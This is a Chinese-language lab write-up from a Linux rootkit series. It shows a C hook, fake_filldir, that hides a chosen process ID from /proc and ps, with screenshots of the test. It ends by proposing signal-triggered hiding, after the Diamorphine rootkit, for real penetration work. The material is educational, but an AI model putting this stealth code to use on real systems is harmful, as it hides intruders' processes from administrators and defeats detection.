---
category: Sec
title: Linux Rootkit 实验 | 00023 Rootkit 基本功能实现x隐藏进程
---

# Linux Rootkit 实验 | 00023 Rootkit 基本功能实现x隐藏进程

## 实验说明

本次实验将初步实现 rootkit 的基本功能：

- 阻止其他内核模块加载
- 提供 root 后门
- 隐藏文件
- 隐藏进程
- 隐藏端口
- 隐藏内核模块

本次实验基于 0001 实验中学习的挂钩技术。

注：由于本次实验内容过多，故分为`00020`到`00025`六个实验报告分别讲解。

**本节实现“隐藏进程”功能**

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验参考的是4.10.10的源码**

## 实验过程

### 隐藏进程

“Linux 上纯用户态枚举并获取进程信息，/proc 是唯一的去处。所以，对用户态隐藏进程，我们可以隐藏掉/proc 下面的目录，这样用户态能枚举出来进程就在我们的控制下了。”

我们只需要把`fake_filldir`修改一下，改为匹配进程号即可：

{% highlight c %}
int
fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    char *endp;
    long pid;

    // 把字符串变成长整数。
    pid = simple_strtol(name, &endp, 10);

    if (pid == SECRET_PROC) {
        // 是我们需要隐藏的进程，直接返回。
        printk("Hiding pid: %ld", pid);
        return 0;
    }
    // 不是需要隐藏的进程，交给真的 ``filldir`` 填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
{% endhighlight %}

测试结果如下：

图片中一个 shell 的`PID`是`3033`。在没有加载模块之前，`ps`可以看到该进程。在加载模块之后，`ps`中无该进程：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-18.png)

卸载模块后，进程重新在`ps`中出现：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-19.png)

## 实验问题

【问题一】

本实验中，我们是把进程号写死在代码里，这样十分不方便。很明显，在实际渗透过程中，我们需要隐藏的进程的进程号只有在运行时才知道。一种可以借鉴的改进思路是：新设定一个信号，模块运行时，我们给哪个进程发该信号，那个进程就被隐藏起来。这是 [m0nad/Diamorphine](https://github.com/m0nad/Diamorphine) 这个 rootkit 的设计。未来我会写一篇文章专门分析这个 rootkit，它的其他思路也是很有意思的。
